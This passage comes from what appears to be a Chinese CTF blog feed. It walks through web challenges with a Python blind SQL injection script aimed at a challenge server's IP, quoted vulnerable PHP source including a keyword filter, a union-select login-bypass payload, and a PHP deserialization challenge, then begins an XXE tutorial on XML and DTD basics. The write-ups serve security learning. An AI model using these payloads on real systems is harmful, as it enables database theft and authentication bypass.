string">"http://59.110.159.206:7010/?id="</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">732</span><span class="token punctuation">,</span> <span class="token number">740</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    table <span class="token operator">=</span> <span class="token string">""</span>    column <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">732</span><span class="token punctuation">,</span> <span class="token number">739</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                ttable <span class="token operator">=</span> table <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ttable<span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>                tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text                <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                    table <span class="token operator">=</span> table <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>                    <span class="token keyword">break</span>            com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>            tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>                <span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        tcolumn <span class="token operator">=</span> column <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                        com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tcolumn<span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>                        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text                        <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                            column <span class="token operator">=</span> column <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                            <span class="token keyword">break</span>                    com <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0||('def','security','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>column <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">,1)"</span></span>                    tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> com<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    <span class="token keyword">if</span> <span class="token string">"Dumb"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>table <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> column<span class="token punctuation">)</span>                        <span class="token keyword">break</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>列名同样</p><pre class="line-numbers language-none"><code class="language-none">securityusersIDUSERNAMEPASSWDemailsGQ&#x3D;flagGFe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用union table来捞出邮箱</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;0 union (table security.emails limit 7,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-04" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 16.00.43.png)</p><p>看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./config.php"</span><span class="token punctuation">;</span><span class="token comment">// error_reporting(0);</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connection failed: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Where is the database?"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"try ?id"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|&lt;|;|"|\^|\||\ |\'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/is'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No select!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;br>Error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'damn hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND passwd= '$&#123;passwd&#125;'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username or passwd wrong, are you admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user not exist or wrong passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求结果中查询出的用户名为admin并且提交的密码和查询的密码相同才能拿到flag，在passwd处做了过滤，那么我们就在username处进行注入就行了，在上面已经得到了users表共有三列，直接union select构造我们自己的username和passwd</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTusername&#x3D;&#39;union select &#39;1&#39;,&#39;admin&#39;,&#39;1&#39;%23&amp;passwd&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h3 id="冬奥会"   >          <a href="#冬奥会" class="heading-link"><i class="fas fa-link"></i></a><a href="#冬奥会" class="headerlink" title="冬奥会"></a>冬奥会</h3>      <p>array_search弱比较，传入数字即可</p><pre class="line-numbers language-none"><code class="language-none">payload:?Information&#x3D;&#123;&quot;year&quot;:&quot;2022a&quot;,&quot;items&quot;:[0,[1,2],1]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="findme"   >          <a href="#findme" class="heading-link"><i class="fas fa-link"></i></a><a href="#findme" class="headerlink" title="findme"></a>findme</h3>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$un0</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un1</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un2</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un3</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$un4</span><span class="token punctuation">;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un3</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'unserialize'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                 <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>             <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                 <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">un0</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">yigei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your output: '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un4</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">giao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">include</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un2</span><span class="token operator">.</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原生类反序列化，先用伪协议读出提示</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowXXE</title>
      <link href="/posts/949d2db6.html"/>
      <url>/posts/949d2db6.html</url>
      
        <content type="html"><![CDATA[        <h2 id="XML基础知识"   >          <a href="#XML基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2>      <p>要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。</p><blockquote><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p></blockquote>        <h3 id="xml的基本格式"   >          <a href="#xml的基本格式" class="heading-link"><i class="fas fa-link"></i></a><a href="#xml的基本格式" class="headerlink" title="xml的基本格式"></a>xml的基本格式</h3>      <pre class="line-numbers language-none"><code class="language-none">- 所有 XML 元素都须有关闭标签- XML 标签对大小写敏感- XML 必须正确地嵌套- XML 文档必须有根元素- XML 的属性值须加引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里放一个正规的例子</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的子元素，category为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--book的子元素，lang为属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的结束--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的结束--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="DTD"   >          <a href="#DTD" class="heading-link"><i class="fas fa-link"></i></a><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3>      <p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义&lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这样</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>receiver</span><span class="token punctuation">></span></span>Myself<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>receiver</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sender</span><span class="token punctuation">></span></span>Someone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sender</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span>TheReminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>msg</span><span class="token punctuation">></span></span>This is an amazing book<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>msg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="内部实体"   >          <a href="#内部实体" class="heading-link"><i class="fas fa-link"></i></a><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3>      <p>带有DTD的XML文档实例</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义&lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt;&lt;message&gt;&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;&lt;sender&gt;Someone&lt;&#x2F;sender&gt;&lt;header&gt;TheReminder&lt;&#x2F;header&gt;&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;&lt;&#x2F;message&gt;<span aria-hidden="true" 